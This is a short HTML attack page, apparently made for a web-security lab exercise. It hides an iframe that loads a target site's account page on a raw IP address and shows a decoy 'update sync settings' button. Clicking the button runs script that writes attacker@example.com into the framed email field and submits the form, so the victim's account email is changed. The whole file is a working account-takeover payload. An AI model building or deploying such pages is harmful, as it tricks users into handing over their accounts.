<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Панель управления</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 900px;
            overflow: hidden;
        }
        .header {
            background: #2c3e50;
            color: white;
            padding: 15px 20px;
            font-weight: bold;
        }
        iframe {
            width: 100%;
            height: 500px;
            border: none;
            display: block;
        }
        .fake-button-area {
            padding: 20px;
            text-align: right;
            background: #f9f9f9;
            border-top: 1px solid #ddd;
        }
        .masked-btn {
            background: #ecf0f1;
            border: 1px solid #bdc3c7;
            padding: 8px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            color: #2c3e50;
            display: inline-block;
            transition: 0.2s;
        }
        .masked-btn:hover {
            background: #dfe6e9;
        }
        .footer {
            background: #fff;
            padding: 10px 20px;
            font-size: 12px;
            color: #7f8c8d;
            text-align: center;
            border-top: 1px solid #ecf0f1;
        }
        #accountFrame {
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">Мой аккаунт</div>
    <iframe id="accountFrame" src="http://62.173.140.174:36108/my-account"></iframe>
    <div class="fake-button-area">
        <div id="fakeSyncBtn" class="masked-btn">Обновить настройки синхронизации</div>
    </div>
    <div class="footer">Безопасная сессия</div>
</div>

<script>
    const iframe = document.getElementById('accountFrame');
    const fakeBtn = document.getElementById('fakeSyncBtn');
    const ATTACKER_EMAIL = 'attacker@example.com';

    function changeEmail() {
        try {
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            if (!doc) {
                alert('Ошибка доступа');
                return;
            }
            const emailInput = doc.querySelector('input[name="email"]');
            if (!emailInput) {
                alert('Форма не найдена');
                return;
            }
            emailInput.value = ATTACKER_EMAIL;
            const form = emailInput.closest('form');
            const submitBtn = form.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.click();
            } else {
                form.submit();
            }
        } catch(e) {
            alert('Ошибка');
        }
    }

    fakeBtn.addEventListener('click', changeEmail);
</script>
</body>
</html>
